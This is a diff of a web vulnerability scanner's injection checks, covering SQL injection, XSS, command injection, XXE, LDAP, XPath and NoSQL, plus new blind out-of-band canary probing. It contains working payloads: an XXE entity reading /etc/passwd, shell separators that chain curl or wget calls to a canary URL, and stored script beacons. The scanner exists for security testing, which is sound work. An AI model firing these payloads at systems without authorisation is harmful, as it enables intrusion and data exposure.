+
+    # v1.8.0: limit 30 -> 40. The surface grew (the new checks add
+    # first-class crawl surface of their own — LDAP directory pages,
+    # OAuth authorize URLs) and at 30 the round-robin silently cut
+    # tail parameters (the battery's planted LFI target fell off),
+    # losing whole detection classes without a trace.
+    targets = ctx.param_targets(limit=40)
+    mk = ctx.marker
     ctx.L(f"  [injection] {len(targets)} target parameters from crawl")
+    # Konteks respons: refleksi verbatim payload (mis. echo JSON) menipu
+    # uji diferensial — bandingkan SETELAH payload dibuang dari body.
+    def _unrefl(body, value):
+        if not body or not value:
+            return body or ""
+        out = body.replace(value, "\x00")
+        try:
+            from urllib.parse import quote as _q
+            out = out.replace(_q(value), "\x00")
+        except Exception:
+            pass
+        return out
     time_tested = 0
     for base, pname, method, orig in targets:
         if ctx.cancelled():
@@ -1037,18 +1692,6 @@ def c_web_injection(ctx, add):
             return ctx.req_param(base, pname, value, method, orig)
         baseline = R("1")
         bbody = baseline.body or ""
-        # Konteks respons: refleksi verbatim payload (mis. echo JSON) menipu
-        # uji diferensial — bandingkan SETELAH payload dibuang dari body.
-        def _unrefl(body, value):
-            if not body or not value:
-                return body or ""
-            out = body.replace(value, "\x00")
-            try:
-                from urllib.parse import quote as _q
-                out = out.replace(_q(value), "\x00")
-            except Exception:
-                pass
-            return out
         _ctype = (baseline.hdr("content-type") or "").lower()
         _is_json = "json" in _ctype
         # Stabilitas baseline: halaman yang berubah-ubah antar request (iklan,
@@ -1071,6 +1714,7 @@ def c_web_injection(ctx, add):
             continue
         # ---------- SQLi error-based (multi-payload, bandingkan baseline)
         sqli_found = False
+        sqli_struct = False  # bukti struktural SQL (error/UNION/boolean) — gerbang XPath
         for payload in ["1'", '1"', "1')", "1' OR '1'='1"]:
             r = R(payload)
             errs = _sql_error_in(r.body, bbody)
@@ -1082,6 +1726,7 @@ def c_web_injection(ctx, add):
                       remed='Use parameterized queries/prepared statements.',
                       confidence="confirmed", location=loc, param=pname))
                 sqli_found = True
+                sqli_struct = True
                 break
         # ---------- SQLi UNION-based (hitung kolom: N cocok + N besar gagal)
         if not sqli_found and stable:
@@ -1107,59 +1752,164 @@ def c_web_injection(ctx, add):
                           remed='Use parameterized queries/prepared statements.',
                           confidence="confirmed", location=loc, param=pname))
                     sqli_found = True
-        # ---------- SQLi boolean-based (pasangan true/false vs baseline)
-        if not sqli_found and stable:
-            rt = R("1 AND 1=1")
-            rf = R("1 AND 1=2")
-            if rt.status and rf.status and rt.body != rf.body:
-                sim_t = similarity(_unrefl(rt.body, "1 AND 1=1"), bbody)
-                sim_f = similarity(_unrefl(rf.body, "1 AND 1=2"), bbody)
-                if sim_t > 0.90 and sim_f < 0.75:
+                    sqli_struct = True
+        # ---------- SQLi heuristic pre-screen (WS2 v1.7.0): a random
+        # string carrying one ' and one " triages the parameter — a
+        # framework casting error means the value is converted to a
+        # number before reaching any query (not string-injectable:
+        # differential/time paths skipped); a fresh DBMS error means
+        # the probe reached a database.
+        heur_val = diffconfirm.heuristic_payload()
+        heur_resp = None
+        _cast = False
+        if not sqli_found and not _is_json:
+            heur_resp = R(heur_val)
+            _tri = diffconfirm.heuristic_triage(
+                heur_resp.status, _unrefl(heur_resp.body, heur_val),
+                bbody, SQL_ERRORS)
+            if _tri == "casting":
+                _cast = True
+                ctx.L(f"  [injection] {base}?{pname}: heuristic probe hit a type-casting error — SQL differential/time paths skipped for this parameter")
+            elif _tri == "dbms_error":
+                ctx.L(f"  [injection] {base}?{pname}: heuristic probe triggered a database error (no baseline error)")
+        # ---------- SQLi boolean-based (WS2 v1.7.0: differential
+        # confirmation with dynamic markings + learned matchRatio +
+        # 4-step verdict + WAF guard, then the Arithmetic Proof Battery
+        # — mandatory for the confirmed tier per decision K2; without a
+        # passed battery the finding is capped at probable.)
+        if not sqli_found and stable and not _cast and not _is_json:
+            from types import SimpleNamespace as _NS
+
+            def _bprobe(v, _hr=heur_resp, _hv=heur_val):
+                if v == _hv and _hr is not None:
+                    return _NS(status=_hr.status,
+                               body=_unrefl(_hr.body or "", v))
+                r = R(v)
+                return _NS(status=r.status, body=_unrefl(r.body or "", v))
+
+            _prover = diffconfirm.BooleanProver(
+                _bprobe, bbody, baseline2.body or "", "1 AND 1=1",
+                "1 AND 1=2", heur_val, error_signatures=SQL_ERRORS)
+            _verd = _prover.run_verdict()
+            if _verd == "fp_waf":
+                ctx.L(f"  [injection] {base}?{pname}: boolean difference rejected as WAF artifact (FALSE POSITIVE guard)")
+            elif _verd == "differential_ok":
+                def _cond(kind, r1, r2, r3):
+                    return {"eq_true": f"1 AND {r1}={r1}",
+                            "eq_false_a": f"1 AND {r1}={r3}",
+                            "eq_false_b": f"1 AND {r3}={r2}",
+                            "invalid": f"1 AND {r3} {r2}",
+                            "eq_true_b": f"1 AND {r2}={r2}"}[kind]
+
+                _bok, _brep = _prover.run_battery(_cond, rounds=1)
+                if _bok:
                     add(F("CRITICAL", f"SQL Injection (boolean-based): {base} param '{pname}'",
-                          'The TRUE-condition response is very similar to the baseline while the FALSE condition differs greatly — the query can be manipulated logically.',
-                          evidence=f"sim(true,base)={sim_t:.2f} sim(false,base)={sim_f:.2f}",
+                          'The parameter answers arithmetic conditions truthfully: a differential verdict (dynamic-content markings, learned match ratio, TRUE/FALSE re-shots, WAF guard) was followed by the Arithmetic Proof Battery — five assertions with fresh random integers all read correctly, which page-shape or reflection artifacts cannot fake.',
+                          evidence=("differential proven; arithmetic proof "
+                                    "battery passed 5/5 assertions (fresh "
+                                    "random integers r1<r2<r3); "
+                                    + "; ".join(_prover.detail)),
                           cwe="CWE-89", owasp="A03:2021 Injection", cvss=9.8,
                           remed='Use parameterized queries/prepared statements.',
                           confidence="confirmed", location=loc, param=pname))
                     sqli_found = True
-        # ---------- SQLi time-based STATISTIK (median 3 baseline, konfirmasi ulang)
-        if not sqli_found and stable and time_tested < 3:
+                    sqli_struct = True
+                else:
+                    add(F("CRITICAL", f"SQL Injection (boolean-based indication): {base} param '{pname}'",
+                          'TRUE/FALSE conditions produce a proven page differential, but the Arithmetic Proof Battery did not pass, so per the accuracy policy this point is capped at probable — fresh random arithmetic was not answered truthfully, which a genuine boolean injection must do.',
+                          evidence=("differential proven; arithmetic proof "
+                                    "battery FAILED: "
+                                    + "; ".join(_brep[-2:])),
+                          cwe="CWE-89", owasp="A03:2021 Injection", cvss=9.8,
+                          remed='Use parameterized queries/prepared statements.',
+                          confidence="probable", location=loc, param=pname))
+                    ctx.L(f"  [injection] {base}?{pname}: boolean differential held but arithmetic battery failed — capped at probable")
+            elif _verd == "indeterminate":
+                ctx.L(f"  [injection] {base}?{pname}: boolean differential indeterminate (error pages / request failures)")
+        # ---------- SQLi time-based (WS1 v1.7.0: statistical timing
+        # oracle — null model from >=30 FALSE-condition samples, MAD
+        # outlier trim, verdict at mean + 7 sigma with a 0.5 s floor,
+        # triple sleep / zero-delay / sleep confirmation. A model with
+        # stdev > 0.5 s is too noisy: INCONCLUSIVE, never a guess.)
+        if not sqli_found and stable and not _cast and time_tested < 3:
             time_tested += 1
-            samples = sorted([baseline.elapsed, baseline2.elapsed, R("1").elapsed])
-            base_med = samples[1]
-            for payload in SQL_TIME_PAYLOADS[:3]:
-                r = R(payload)
-                if r.elapsed >= 2.6 and r.elapsed > base_med + 2.4:
-                    r2 = R(payload)
-                    if r2.elapsed >= 2.6 and r2.elapsed > base_med + 2.4:
+            _model = timingoracle.TimingModel()
+
+            def _fsample():
+                _r = R("1 AND 1=2")
+                return _r.elapsed if _r.status else None
+
+            _model.collect(_fsample, cancelled=ctx.cancelled)
+            if not _model.ready or _model.noisy:
+                ctx.L(f"  [injection] {base}?{pname}: timing oracle INCONCLUSIVE ({_model.describe()})")
+            else:
+                for payload in SQL_TIME_PAYLOADS:
+                    if ctx.cancelled():
+                        break
+                    _twin = _zero_delay(payload)
+                    if _twin == payload:
+                        continue
+
+                    def _fire(want, _p=payload, _t=_twin):
+                        _r = R(_p if want else _t)
+                        return _r.elapsed if _r.status else None
+
+                    if _model.confirm(_fire, cancelled=ctx.cancelled) \
+                            == timingoracle.DELAYED:
                         add(F("CRITICAL", f"SQL Injection (time-based): {base} param '{pname}'",
-                              f"The sleep payload delayed the response twice in a row, far above the baseline median of {base_med:.2f} dtk (3 sampel).",
-                              evidence=f"payload={payload!r} elapsed={r.elapsed:.1f}s/{r2.elapsed:.1f}s median={base_med:.2f}s",
+                              'The delay payload was confirmed by the statistical timing oracle: the null model was built from false-condition samples and the delay fired in the triple sleep / zero-delay / sleep sequence.',
+                              evidence=f"payload={payload!r}; {_model.describe()}",
                               cwe="CWE-89", owasp="A03:2021 Injection", cvss=9.8,
                               remed='Use parameterized queries/prepared statements.',
                               confidence="confirmed", location=loc, param=pname))
                         sqli_found = True
                         break
-        # ---------- XSS reflected (multi-konteks, marker unik per scan)
-        mk = ctx.marker
-        xss_payloads = [
-            f'"><svg/onload=ptk{mk}>',
-            f"'<svg/onload=ptk{mk}>",
-            f"<svg/onload=ptk{mk}>",
-            f'"><img src=x onerror=ptk{mk}>',
-        ]
-        for payload in xss_payloads:
-            if _is_json:
-                ctx.L(f"  [injection] {base}?{pname}: JSON response — reflection inside an escaped JSON string is not an HTML context, XSS test skipped")
-                break
-            r = R(payload)
-            if payload in (r.body or ""):
-                add(F("HIGH", f"Reflected XSS verified: {base} param '{pname}'",
-                      'The payload was reflected INTACT without HTML encoding — the per-scan unique marker was found exactly as sent.',
-                      evidence=payload[:90], cwe="CWE-79", owasp="A03:2021 Injection",
-                      cvss=8.1, remed='Encode output by context (HTML/attr/JS). Add a CSP. Use auto-escaping templates.',
-                      confidence="confirmed", location=loc, param=pname))
-                break
+        # ---------- XSS reflected (WS2 v1.4.0: marker sandwich +
+        # parsed-DOM position evidence — reflection alone is NOT a
+        # finding; dalfox discipline per the source audit. The marker
+        # probe goes first: whether the sandwich reflects, and which
+        # special characters survive, chooses the payload family.)
+        if _is_json:
+            ctx.L(f"  [injection] {base}?{pname}: JSON response — reflection inside an escaped JSON string is not an HTML context, XSS test skipped")
+        else:
+            marks = ctx.xss_marks()
+            rp = R(xssverify.sandwich_probe(marks))
+            pbody = rp.body or ""
+            if marks["inner"] in pbody or marks["open"] in pbody:
+                survived = xssverify.surviving_chars(pbody, marks)
+                fams = xssverify.payload_families(survived)
+                ctx.L(f"  [xss] {base}?{pname}: sandwich reflected; "
+                      f"surviving={''.join(sorted(survived)) or '-'} "
+                      f"families={fams}")
+                xss_confirmed = False
+                near_note = ""
+                for fam, payload in xssverify.build_payloads(marks, fams):
+                    r = R(payload)
+                    res = xssverify.analyze(
+                        r.status, r.hdr("content-type") or "",
+                        r.body or "", bbody, marks)
+                    if res["verdict"] == "confirmed":
+                        add(F("HIGH", f"Reflected XSS verified: {base} param '{pname}'",
+                              'The per-scan marker sandwich reached an executable position in the parsed DOM ('
+                              + ", ".join(res["kinds"]) + '). Reflection alone is never credited: the payload marker had to survive HTML parsing inside a sink-bearing position (event handler, javascript:/data: URL, script element/context, or marker element with a surviving sink).',
+                              evidence=f"payload={payload[:80]!r} -> {res['detail']}",
+                              cwe="CWE-79", owasp="A03:2021 Injection",
+                              cvss=8.1, remed='Encode output by context (HTML/attr/JS). Add a CSP. Use auto-escaping templates.',
+                              confidence="confirmed", location=loc, param=pname))
+                        xss_confirmed = True
+                        break
+                    if res["verdict"] == "reflected" and res["near_miss"] \
+                            and not near_note:
+                        near_note = res["detail"]
+                if not xss_confirmed and near_note:
+                    add(F("MEDIUM", f"Reflected XSS (position not confirmed): {base} param '{pname}'",
+                          'The marker sandwich was reflected into a markup/JS context, but no payload reached a proven executable position in the parsed DOM — reported as probable (position not confirmed), never as verified XSS. Manual validation (or the headless execution check) is required to promote this.',
+                          evidence=near_note, cwe="CWE-79",
+                          owasp="A03:2021 Injection", cvss=5.4,
+                          remed='Encode output by context (HTML/attr/JS). Add a CSP. Use auto-escaping templates.',
+                          confidence="probable", location=loc, param=pname))
+            else:
+                ctx.L(f"  [xss] {base}?{pname}: marker not reflected — XSS payloads not fired")
         # ---------- SSTI (hasil komputasi harus muncul, literal payload tidak)
         a, b = ctx.num_a, ctx.num_b
         expect = str(a * b)
@@ -1233,15 +1983,35 @@ def c_web_injection(ctx, add):
                           confidence="confirmed", location=loc, param=pname))
                     cmd_found = True
                     break
-        if not cmd_found and time_tested <= 2:
-            r = R("1; sleep 3")
-            if r.elapsed >= 2.6 and r.elapsed > baseline.elapsed + 2.2:
-                add(F("CRITICAL", f"Command Injection (time-based): {base} param '{pname}'",
-                      'The sleep command consistently delays the response.',
-                      evidence=f"elapsed={r.elapsed:.1f}s vs baseline {baseline.elapsed:.1f}s",
-                      cwe="CWE-78", owasp="A03:2021 Injection", cvss=9.8,
-                      remed="Hindari shell; pakai API library & whitelist argumen.",
-                      confidence="probable", location=loc, param=pname))
+        if not cmd_found and stable and time_tested < 3:
+            # WS1 v1.7.0: the single-shot sleep guess is replaced by the
+            # statistical timing oracle (model from plain-value samples,
+            # triple sleep / sleep-0 / sleep confirmation). Shares the
+            # per-scan time-test budget (time_tested) with the SQLi path
+            # because a model costs >=30 requests to build.
+            time_tested += 1
+            _cmodel = timingoracle.TimingModel()
+
+            def _csample():
+                _r = R("1")
+                return _r.elapsed if _r.status else None
+
+            _cmodel.collect(_csample, cancelled=ctx.cancelled)
+            if not _cmodel.ready or _cmodel.noisy:
+                ctx.L(f"  [injection] {base}?{pname}: CMDi timing oracle INCONCLUSIVE ({_cmodel.describe()})")
+            else:
+                def _cfire(want):
+                    _r = R("1; sleep 3" if want else "1; sleep 0")
+                    return _r.elapsed if _r.status else None
+
+                if _cmodel.confirm(_cfire, cancelled=ctx.cancelled) \
+                        == timingoracle.DELAYED:
+                    add(F("CRITICAL", f"Command Injection (time-based): {base} param '{pname}'",
+                          'The sleep command delay was confirmed by the statistical timing oracle (null model from baseline samples; triple sleep / sleep-0 / sleep sequence fired).',
+                          evidence=f"payload='1; sleep 3'; {_cmodel.describe()}",
+                          cwe="CWE-78", owasp="A03:2021 Injection", cvss=9.8,
+                          remed="Hindari shell; pakai API library & whitelist argumen.",
+                          confidence="confirmed", location=loc, param=pname))
         # ---------- XXE (POST XML ke endpoint parameter; entitas harus TER-EXPAND)
         xxe_body = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY ptk SYSTEM '
                     f'"file:///etc/passwd">]><r>&ptk;</r>')
@@ -1255,6 +2025,7 @@ def c_web_injection(ctx, add):
                   remed='Disable DTD/external entities in the XML parser (defusedxml / feature off).',
                   confidence="confirmed", location=loc, param=pname))
         # ---------- LDAP injection (signature error LDAP di respons, bukan di baseline)
+        _ldap_err = False
         for payload in ["*)(|(objectClass=*)", "*)(&(|", "admin)(|(password=*"]:
             r = R(payload)
             low = (r.body or "").lower()
@@ -1270,7 +2041,39 @@ def c_web_injection(ctx, add):
                           owasp="A03:2021 Injection", cvss=8.1,
                           remed='Escape LDAP special characters (&, (, ), *, \\\\) in input; use parameterized filters.',
                           confidence="probable", location=loc, param=pname))
+                    _ldap_err = True
                     break
+        # ---------- LDAP boolean differential (WS1 v1.8.0): the
+        # wildcard-vs-impossible pair judged by the diffconfirm oracle.
+        # Runs only with directory context: an LDAP error was observed
+        # for this parameter, or the endpoint/parameter is shaped like
+        # a directory/search field. The confirmed tier additionally
+        # requires the independent error evidence — a bare wildcard
+        # contrast on a generic search box stays probable.
+        if stable and not _is_json and not sqli_struct and \
+                (_ldap_err or _LDAP_HINT.search(base)
+                 or _LDAP_HINT.search(pname)):
+            _lv, _ld = _ldap_differential(ctx, R, bbody, _unrefl)
+            if _lv == "full" and _ldap_err:
+                add(F("HIGH", f"LDAP Injection (boolean-based): {base} param '{pname}'",
+                      'The parameter value is interpreted as LDAP filter syntax: a wildcard value reproducibly returns the full result set while impossible values, a junk control and the plain baseline value return the empty result, and malformed filter payloads make the backend answer with directory errors. Input reaches the LDAP filter without escaping. (The Arithmetic Proof Battery does not apply to LDAP filters — filter syntax has no arithmetic conditions; this verdict rests on the differential plus independent directory-error evidence, a documented exception like the XPath boolean path.)',
+                      evidence=_ld, cwe="CWE-90",
+                      owasp="A03:2021 Injection", cvss=8.6,
+                      remed='Escape LDAP special characters (&, (, ), *, \\\\) in input; use parameterized filters.',
+                      confidence="confirmed", location=loc, param=pname))
+            elif _lv in ("full", "partial"):
+                add(F("HIGH", f"LDAP Injection (boolean indication): {base} param '{pname}'",
+                      'A wildcard value changes this parameter\'s result set the way an LDAP presence filter would (full set) while impossible values return the empty result — filter-semantics behaviour. Reported as probable: either the differential controls were not all clean or no independent directory-error evidence was observed for this parameter.',
+                      evidence=_ld, cwe="CWE-90",
+                      owasp="A03:2021 Injection", cvss=8.1,
+                      remed='Escape LDAP special characters (&, (, ), *, \\\\) in input; use parameterized filters.',
+                      confidence="probable", location=loc, param=pname))
+            else:
+                ctx.L(f"  [ldap] {base}?{pname}: differential {_lv} ({_ld})")
+        _xpath_probe(base, pname, R, bbody, loc, stable, sqli_struct,
+                     _is_json)
+        if ctx.cancelled():
+            return
         # ---------- NoSQL injection (operator Mongo sebagai nilai: respons berubah drastis)
         for payload in ['{"$gt": ""}', '{"$ne": null}']:
             r = R(payload)
@@ -1284,6 +2087,35 @@ def c_web_injection(ctx, add):
                           remed='Reject object/operator-typed values from input; sanitize $ and . in keys.',
                           confidence="probable", location=loc, param=pname))
                     break
+    # ---------- XPath extra pass: GET parameters from the wider pool
+    # (param_targets limit=60) that did not make the main injection list
+    # (limit=30). Without this, an XPath endpoint linked late in the
+    # crawl would never be XPath-tested at all — the round-robin target
+    # merge starves late GET parameters when forms/guesses fill the
+    # list. Bounded: at most 6 extra parameters, <=8 requests each;
+    # SQL cannot have been proven on them (they were never in the main
+    # list), so the structural-SQL gate passes False.
+    _main_keys = {(b, p) for b, p, _m, _o in targets}
+    _extra = 0
+    for base, pname, method, orig in ctx.param_targets(limit=60):
+        if _extra >= 6 or ctx.cancelled():
+            break
+        if method != "GET" or not orig or (base, pname) in _main_keys:
+            continue
+        _main_keys.add((base, pname))
+        _extra += 1
+        _br = ctx.client.get(orig)
+        if _br.status not in (200, 500) or not _br.body:
+            continue
+        _bb = _br.body or ""
+        _stable = similarity(
+            _bb, ctx.client.get(orig).body or "") > 0.80
+
+        def _Rx(value, _b=base, _p=pname, _o=orig):
+            return ctx.req_param(_b, _p, value, "GET", _o)
+
+        _xpath_probe(base, pname, _Rx, _bb, base, _stable, False,
+                     "json" in (_br.hdr("content-type") or "").lower())
 
 
 def c_crlf_injection(ctx, add):
@@ -1315,29 +2147,115 @@ def c_crlf_injection(ctx, add):
                 return
 
 
+def _oob_issue(ctx, reg, base, kind, loc, pname, payload_class):
+    """Plant one token through the FORMAL registry (WS1): the token is
+    issued with its full attribution record {scan_id, check, target,
+    parameter, payload_class} and mirrored into ctx._oob_planted so the
+    runner's grace-window finalize can re-poll exactly this scan's
+    tokens. Returns (callback_url, entry)."""
+    tok = reg.issue(f"{kind.lower()} {loc} {pname}", meta={
+        "scan_id": ctx.scan_id, "check": "c_blind_oob", "target": loc,
+        "parameter": pname, "payload_class": payload_class})
+    entry = {"token": tok, "kind": kind, "location": loc, "param": pname,
+             "check": "c_blind_oob", "payload_class": payload_class,
+             "scan_id": ctx.scan_id}
+    ctx._oob_planted.append(entry)
+    ctx._oob_last_plant_ts = time.time()
+    return reg.url(base, tok), entry
+
+
+def _oob_emit(ctx, add, entry, hits):
+    """Turn one planted token's real callback(s) into its finding. The
+    finding exists ONLY because a callback arrived — that is the whole
+    evidence model of this module."""
+    tok, kind = entry["token"], entry["kind"]
+    loc, pname = entry["location"], entry["param"]
+    h = hits[0]
+    ev = (f"canary callback from {h.get('ip')} ({h.get('method')} /{tok}) "
+          f"UA: {h.get('user_agent', '')[:60]} — token registry: scan "
+          f"{entry['scan_id']}, check {entry['check']}, class "
+          f"{entry['payload_class']}"
+          + (f", {len(hits)} callbacks total" if len(hits) > 1 else ""))
+    if kind == "SSRF":
+        add(F("CRITICAL", f"Blind SSRF confirmed via out-of-band callback: {loc} param '{pname}'",
+              "The server fetched the unique canary URL planted in this parameter — server-side request forgery proven by an actual inbound callback, not by response inference. The fetcher can likely be pointed at internal services and cloud metadata.",
+              evidence=ev, cwe="CWE-918", owasp="A10:2021 SSRF", cvss=9.1,
+              remed="Whitelist destination hosts/schemes for server-side fetches; block private, loopback and metadata addresses.",
+              confidence="confirmed", location=loc, param=pname))
+    elif kind == "XXE":
+        add(F("CRITICAL", f"Blind XXE confirmed via out-of-band callback: {loc}",
+              "The XML parser resolved the external entity planted in the posted XML body and called the canary URL — XML External Entity processing is enabled on this endpoint.",
+              evidence=ev, cwe="CWE-611", owasp="A05:2021 Security Misconfiguration", cvss=8.2,
+              remed="Disable DTD/external entities in the XML parser (disallow DOCTYPE or external entity resolution).",
+              confidence="confirmed", location=loc, param=""))
+    elif kind == "CMDi":
+        add(F("CRITICAL", f"Blind command injection confirmed via out-of-band callback: {loc} param '{pname}'",
+              "A shell command separator planted in this parameter executed a command that fetched the unique canary URL — command injection proven by an actual inbound callback (no response or timing inference involved).",
+              evidence=ev, cwe="CWE-78", owasp="A03:2021 Injection", cvss=9.8,
+              remed="Never pass user input to a shell; use exec-with-argument-array APIs and a strict allowlist for values such as hosts/addresses.",
+              confidence="confirmed", location=loc, param=pname))
+    elif kind == "XSS":
+        add(F("HIGH", f"Blind XSS confirmed via out-of-band callback: {loc}",
+              "A script planted through this form was loaded from the canary origin — the stored content was rendered in a context that fetched the unique canary URL, proving stored script execution reaches a viewer's browser (or a server-side renderer). No callback would mean unproven, and none is claimed without one.",
+              evidence=ev, cwe="CWE-79", owasp="A03:2021 Injection", cvss=6.1,
+              remed="Contextually encode all user content on output; deploy a Content-Security-Policy that does not allow arbitrary script origins.",
+              confidence="confirmed", location=loc, param=""))
+
+
+def _oob_sweep(ctx, add):
+    """Emit findings for every planted token of this scan that has
+    callbacks and has not been reported yet. Returns the number of
+    newly reported tokens. Used by c_blind_oob (initial pass) and by
+    the runner's grace-window finalize (late callbacks)."""
+    reg = (ctx.opts.get("canary") or {}).get("registry")
+    if not reg:
+        return 0
+    n = 0
+    for entry in ctx._oob_planted:
+        if entry["token"] in ctx._oob_reported:
+            continue
+        try:
+            hits = reg.hits(entry["token"])
+        except Exception:
+            hits = []
+        if hits:
+            ctx._oob_reported.add(entry["token"])
+            _oob_emit(ctx, add, entry, hits)
+            n += 1
+    return n
+
+
+_CMDI_PARAM_NAMES = {"host", "ip", "addr", "address", "cmd", "ping",
+                     "target", "domain", "hostname", "server"}
+
+
 def c_blind_oob(ctx, add):
-    """Blind SSRF/XXE via canary out-of-band (Fase 4): token unik ditanam ke
-    parameter URL (SSRF) dan body XML (XXE). Temuan HANYA lahir dari callback
-    sungguhan yang tercatat registry — tanpa callback, tidak ada klaim
-    (buta berarti tidak terbukti, bukan aman). Canary tidak tersedia ->
-    check menyatakan diri dilewati di log."""
+    """Blind SSRF/XXE/CMDi/XSS via canary out-of-band (WS1, v1.4.0):
+    tokens are planted through the formal per-scan registry (SSRF into
+    URL parameters, XXE into XML bodies, blind CMDi into host-like
+    parameters, blind XSS script beacons into stored-content forms).
+    Findings are born ONLY from real callbacks recorded by the
+    registry — no callback, no claim (blind means unproven, not safe).
+    The runner re-polls after a grace window (default 60s) for late
+    callbacks; an explicit '0 callbacks' note is recorded in the scan
+    meta. Canary unavailable -> the check declares itself skipped."""
     can = ctx.opts.get("canary") or {}
     reg, base = can.get("registry"), can.get("base")
     if not reg or not base:
-        ctx.L("  [oob] canary listener not configured — blind SSRF/XXE "
+        ctx.L("  [oob] canary listener not configured — blind SSRF/XXE/CMDi/XSS "
               "skipped (declared, not assumed safe)")
         return
-    planted = []
+    planted0 = len(ctx._oob_planted)
     n_ssrf = 0
     for pth, pname, method, orig in ctx.param_targets(limit=40):
         if pname.lower() not in crawl_mod.URL_PARAM_NAMES:
             continue
-        tok = reg.issue(f"ssrf {pth} {pname}")
+        url, _e = _oob_issue(ctx, reg, base, "SSRF", pth, pname,
+                             "url-parameter fetch")
         try:
-            ctx.req_param(pth, pname, reg.url(base, tok), method, orig)
+            ctx.req_param(pth, pname, url, method, orig)
         except Exception:
             continue
-        planted.append((tok, "SSRF", pth, pname))
         n_ssrf += 1
         if n_ssrf >= 4:
             break
@@ -1356,45 +2274,106 @@ def c_blind_oob(ctx, add):
         if url in seen_u or n_xxe >= 3:
             continue
         seen_u.add(url)
-        tok = reg.issue(f"xxe {url}")
+        tok_url, _e = _oob_issue(ctx, reg, base, "XXE", url, "",
+                                 "xml external entity")
         payload = ('<?xml version="1.0" encoding="UTF-8"?>'
                    '<!DOCTYPE r [<!ENTITY x SYSTEM "'
-                   + reg.url(base, tok) + '">]><r>&x;</r>')
+                   + tok_url + '">]><r>&x;</r>')
         try:
             ctx.client.post(url, data=payload,
                             headers={"Content-Type": "application/xml"})
         except Exception:
             continue
-        planted.append((tok, "XXE", url, ""))
         n_xxe += 1
+    # ---- blind CMDi: shell separators + a fetcher command per token,
+    # so a callback identifies the exact form that executed.
+    n_cmdi = 0
+    for pth, pname, method, orig in ctx.param_targets(limit=60):
+        if n_cmdi >= 4:
+            break
+        if pname.lower() not in _CMDI_PARAM_NAMES:
+            continue
+        host_val = orig if orig and re.fullmatch(r"[A-Za-z0-9.\-]{1,60}", orig or "") \
+            else "127.0.0.1"
+        for sep, tool in ((";", "curl -s"), ("|", "wget -qO-")):
+            url, _e = _oob_issue(ctx, reg, base, "CMDi", pth, pname,
+                                 f"shell separator '{sep}' + {tool.split()[0]}")
+            try:
+                ctx.req_param(pth, pname, f"{host_val}{sep}{tool} {url}",
+                              method, orig)
+            except Exception:
+                continue
+            n_cmdi += 1
+    # ---- blind XSS: script beacons stored via non-auth forms; the
+    # pages are re-visited afterwards (victim-view trigger for
+    # server-side renderers). A callback means a browser/renderer
+    # actually loaded the beacon.
+    n_xss = 0
+    for form in surf.forms:
+        if n_xss >= 3:
+            break
+        if form.get("method", "GET").upper() != "POST":
+            continue
+        action = form.get("action") or ""
+        low = action.lower()
+        if any(k in low for k in ("login", "auth", "register", "signup",
+                                  "sign-up", "password")):
+            continue
+        fields = []
+        for inp in form.get("inputs", []):
+            # Crawler input records come in two shapes: dicts
+            # {"name", "type"} and bare name strings.
+            if isinstance(inp, str):
+                nm, itype = inp.strip(), "text"
+            elif isinstance(inp, dict):
+                nm = (inp.get("name") or "").strip()
+                itype = (inp.get("type") or "text").lower()
+            else:
+                continue
+            if not nm:
+                continue
+            low_nm = nm.lower()
+            if any(k in low_nm for k in ("pass", "email", "token", "csrf")):
+                continue
+            if itype in ("hidden", "file", "submit", "button",
+                         "checkbox", "radio"):
+                continue
+            fields.append(nm)
+        if not fields:
+            continue
+        url, _e = _oob_issue(ctx, reg, base, "XSS", action, fields[0],
+                             "stored script beacon")
+        data = {nm: "fixture text" for nm in fields}
+        data[fields[0]] = f'<script src="{url}"></script>'
+        if len(fields) > 1:
+            data[fields[1]] = f'<img src="{url}">'
+        try:
+            # the client sends `data` verbatim — form-encode it here
+            ctx.client.post(action, data=urlencode(data))
+        except Exception:
+            continue
+        n_xss += 1
+        for view in (form.get("page") or "", action):
+            if view:
+                try:
+                    # Fresh fetch (verify header taints the client GET
+                    # cache): a cached pre-plant body would never make
+                    # the target render the beacon.
+                    ctx.client.get(view, headers=_VERIFY_HDR)
+                except Exception:
+                    pass
+    planted = ctx._oob_planted[planted0:]
     if not planted:
-        ctx.L("  [oob] no suitable SSRF/XXE injection points found")
+        ctx.L("  [oob] no suitable SSRF/XXE/CMDi/XSS injection points found")
         return
     ctx.L(f"  [oob] {len(planted)} canary tokens planted "
-          f"({n_ssrf} SSRF, {n_xxe} XXE) — waiting for callbacks")
+          f"({n_ssrf} SSRF, {n_xxe} XXE, {n_cmdi} CMDi, {n_xss} XSS) — "
+          "waiting for callbacks")
     time.sleep(3.0)
-    confirmed = 0
-    for tok, kind, loc, pname in planted:
-        hits = reg.hits(tok)
-        if not hits:
-            continue
-        h = hits[0]
-        confirmed += 1
-        if kind == "SSRF":
-            add(F("CRITICAL", f"Blind SSRF confirmed via out-of-band callback: {loc} param '{pname}'",
-                  "The server fetched the unique canary URL planted in this parameter — server-side request forgery proven by an actual inbound callback, not by response inference. The fetcher can likely be pointed at internal services and cloud metadata.",
-                  evidence=f"canary callback from {h.get('ip')} ({h.get('method')} /{tok}) UA: {h.get('user_agent', '')[:60]}",
-                  cwe="CWE-918", owasp="A10:2021 SSRF", cvss=9.1,
-                  remed="Whitelist destination hosts/schemes for server-side fetches; block private, loopback and metadata addresses.",
-                  confidence="confirmed", location=loc, param=pname))
-        else:
-            add(F("CRITICAL", f"Blind XXE confirmed via out-of-band callback: {loc}",
-                  "The XML parser resolved the external entity planted in the posted XML body and called the canary URL — XML External Entity processing is enabled on this endpoint.",
-                  evidence=f"canary callback from {h.get('ip')} ({h.get('method')} /{tok}) UA: {h.get('user_agent', '')[:60]}",
-                  cwe="CWE-611", owasp="A05:2021 Security Misconfiguration", cvss=8.2,
-                  remed="Disable DTD/external entities in the XML parser (disallow DOCTYPE or external entity resolution).",
-                  confidence="confirmed", location=loc, param=""))
-    ctx.L(f"  [oob] callbacks confirmed: {confirmed}/{len(planted)} planted tokens")
+    confirmed = _oob_sweep(ctx, add)
+    ctx.L(f"  [oob] callbacks confirmed: {confirmed}/{len(planted)} planted "
+          f"tokens (grace-window re-poll at end of scan: "
+          f"{ctx.canary_grace_s:.0f}s)")
 
 
 def c_ssrf(ctx, add):
@@ -1559,7 +2538,7 @@ def c_services(ctx, add):
             continue
         try:
             conn = _hc.HTTPConnection(host, port, timeout=4)
-            conn.request("GET", path, headers={"User-Agent": "VANTHEX/1.1.1"})
